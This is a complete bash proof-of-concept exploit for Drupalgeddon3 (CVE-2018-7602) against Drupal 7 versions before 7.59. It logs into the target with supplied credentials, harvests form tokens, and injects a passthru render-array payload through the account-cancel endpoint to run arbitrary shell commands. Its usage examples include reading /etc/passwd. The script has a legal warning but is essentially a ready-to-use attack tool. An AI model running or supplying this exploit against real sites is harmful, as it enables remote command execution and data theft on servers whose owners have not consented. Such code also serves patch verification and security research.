#! /bin/bash

if [[ $# -ne 4 ]] ; then
    echo "This POC will exploit a known vulnerability in Drupal 7 versions (prior to Drupal 7.59)"
    echo "This is an authenticated exploit - it requires a user account on the target. However no special privileges are required."
    echo "Using this POC may be illegal if you do not have written permission to test the target machine..."
    echo ""
    echo 'USAGE:   '$0' [site_url] [username] [password] [url_encoded_payload]'
    echo ""
    echo "Examples:"
    echo $0" http://www.example.com testuser testpass id"
    echo $0" http://www.example.com testuser testpass ls+-la"
    echo $0" http://www.example.com testuser testpass grep+%22Drupal+%22+CHANGELOG.txt%7Chead+-n1"
    echo $0" http://www.example.com testuser testpass cat+%2Fetc%2Fpasswd"
    echo ""
    exit 1
fi

site_url=$1
username=$2
password=$3
payload=$4

echo ""
echo "================================="
echo "Drupalgeddon3 (CVE-2018-7602) POC"
echo "================================="
echo ""

#Collect form id for logon
form_build_id1=$(curl -k -s $site_url'/?q=node&destination=node' --cookie 'Drupal.toolbar.collapsed=0; has_js=1' | grep form_build_id | sed -E 's/.*name="form_build_id" value="(.*)".*/\1/')
#Logon
cookies=$(curl -k -L -i -s $site_url'/?q=node&destination=node' --cookie 'Drupal.toolbar.collapsed=0; has_js=1' --data 'name='$username'&pass='$password'&form_build_id='$form_build_id1'&form_id=user_login_block&op=Log+in' | grep Set-Cookie | sed -E 's/.*Set-Cookie: (.*); expires.*/\1/')

if [[ ! -z $cookies ]] ; then
  echo "[+] Logged in with Session ID: "$cookies
  #Collect User ID
  usernum=$(curl -k -s $site_url'/?q=user' --cookie 'Drupal.toolbar.collapsed=0; has_js=1; '$cookies | grep "#me" | sed -E 's/.*user\/(.*)#me.*/\1/')
  echo "[+] Found User ID: "$usernum
  #Collect form id for Delete User endpoint
  form_token=$(curl -k -s $site_url'/?q=user/'$usernum'/cancel' --cookie 'Drupal.toolbar.collapsed=0; has_js=1; '$cookies | grep form_token | sed -E 's/.*name="form_token" value="(.*)".*/\1/')
  #Send payload
  form_build_id2=$(curl -k -s $site_url'/?q=user/'$usernum'/cancel&destination=user/'$usernum'/cancel?q\[%2523post_render\]\[\]=passthru%26q\[%2523type\]=markup%26q\[%2523markup\]='$payload --cookie 'Drupal.toolbar.collapsed=0; has_js=1; '$cookies --data 'form_token='$form_token'&form_id=user_cancel_confirm_form&op=Cancel+account&_triggering_element_name=form_id' | grep form_build_id | sed -E 's/.*name="form_build_id" value="(.*)".*/\1/')
  echo "[+] Payload sent via Delete User endpoint: "$payload
  echo "[+] Calling payload response in Form ID: "$form_build_id2
  echo ""
  #Retrieve payload response (plus JSON response)
  curl -k -s $site_url'/?q=file/ajax/actions/cancel/%23options/path/'$form_build_id2 --cookie 'Drupal.toolbar.collapsed=0; has_js=1; '$cookies --data "form_build_id="$form_build_id2
  echo ""
else
  echo "[-] Login creds not accepted"
  echo "You need valid user credentials to run this exploit"
fi
exit 1
